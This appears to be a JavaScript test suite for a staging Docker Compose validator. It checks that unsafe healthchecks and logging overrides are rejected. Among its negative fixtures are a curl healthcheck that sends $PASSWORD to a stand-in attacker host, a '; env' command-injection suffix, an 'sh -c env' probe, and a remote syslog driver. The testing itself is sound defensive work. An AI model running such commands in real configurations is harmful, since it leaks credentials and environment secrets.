import test from 'node:test';
import assert from 'node:assert/strict';
import { safeStagingObservabilityBoundary } from '../infra/staging/compose-observability-boundary.mjs';
import { inspectResolvedStagingCompose } from '../infra/staging/verify-resolved-compose.mjs';

const names = ['postgres', 'redis', 'api', 'web', 'staging-edge'];
const fixture = () => ({
  postgres: { healthcheck: { test: ['CMD-SHELL', 'pg_isready -U ${POSTGRES_USER} -d ${POSTGRES_DB}'], interval: '10s', retries: 12 } },
  redis: { command: ['redis-server', '--requirepass', 'synthetic-pass'],
    healthcheck: { test: ['CMD', 'redis-cli', '--pass', 'synthetic-pass', 'ping'], interval: '10s', retries: 12 } },
  api: {}, web: {},
  'staging-edge': { healthcheck: { test: ['CMD-SHELL', 'wget -q -O /dev/null http://127.0.0.1:8080/edge-health'],
    interval: '20s', timeout: '4s', start_period: '15s', retries: 3 } },
});
const integrated = services => inspectResolvedStagingCompose({ services }, 'a'.repeat(40))
  .find(check => check.name === 'No executable healthcheck or external logging override')?.passed;

test('S47 permits only reviewed staging healthchecks and no remote logging', () => {
  assert.equal(safeStagingObservabilityBoundary(fixture()), true);
  assert.equal(integrated(fixture()), true);
  const minimal = fixture(); for (const name of names) delete minimal[name].healthcheck;
  assert.equal(safeStagingObservabilityBoundary(minimal), true);
  assert.equal(integrated(minimal), true);
});

test('S47 accepts only the exact Docker Compose escaped PostgreSQL probe form', () => {
  const services = fixture();
  const dollar = String.fromCharCode(36, 36);
  services.postgres.healthcheck.test[1] =
    'pg_isready -U ' + dollar + '{POSTGRES_USER} -d ' + dollar + '{POSTGRES_DB}';
  assert.equal(safeStagingObservabilityBoundary(services), true);
  assert.equal(integrated(services), true);
  services.postgres.healthcheck.test[1] += '; env';
  assert.equal(safeStagingObservabilityBoundary(services), false);
});

test('S47 rejects remote log drivers and file-sourced labels on every service', () => {
  for (const name of names) for (const [field, value] of [
    ['logging', { driver: 'syslog', options: { 'syslog-address': 'tcp://203.0.113.1:514' } }],
    ['logging', {}], ['label_file', ['/tmp/prod.labels']]]) {
    const services = fixture(); services[name][field] = value;
    assert.equal(safeStagingObservabilityBoundary(services), false, `${name}:${field}`);
    assert.equal(integrated(services), false, `${name}:${field}:integration`);
  }
});

test('S47 blocks healthcheck shell injection, network exfiltration and disabled probes', () => {
  for (const name of names) for (const healthcheck of [
    { test: ['CMD-SHELL', 'curl https://attacker.invalid/?secret=$PASSWORD'] },
    { test: ['NONE'] }, { disable: true },
    { test: ['CMD', 'sh', '-c', 'env'] }]) {
    const services = fixture(); services[name].healthcheck = healthcheck;
    assert.equal(safeStagingObservabilityBoundary(services), false, name);
    assert.equal(integrated(services), false, name + ':integration');
  }
});

test('S47 binds Redis healthcheck credentials to reviewed Redis command', () => {
  const services = fixture(); services.redis.healthcheck.test[3] = 'wrong-password';
  assert.equal(safeStagingObservabilityBoundary(services), false);
  assert.equal(integrated(services), false);
  const other = fixture(); other.redis.command[2] = '';
  assert.equal(safeStagingObservabilityBoundary(other), false);
});

test('S47 rejects weakened or unbounded probe scheduling', () => {
  for (const name of ['postgres', 'redis', 'staging-edge']) {
    for (const [field, value] of [['interval', '1ms'], ['retries', 0], ['start_interval', '1ms']]) {
      const services = fixture(); services[name].healthcheck[field] = value;
      assert.equal(safeStagingObservabilityBoundary(services), false, `${name}:${field}`);
    }
  }
});

test('S47 blocks new executable healthchecks on API and web', () => {
  for (const name of ['api', 'web']) {
    const services = fixture(); services[name].healthcheck = { test: ['CMD', 'true'] };
    assert.equal(safeStagingObservabilityBoundary(services), false, name);
    assert.equal(integrated(services), false, name + ':integration');
  }
});

test('S47 fails closed for malformed or missing staging services', () => {
  for (const services of [null, [], {}, { postgres: {} }])
    assert.equal(safeStagingObservabilityBoundary(services), false);
});
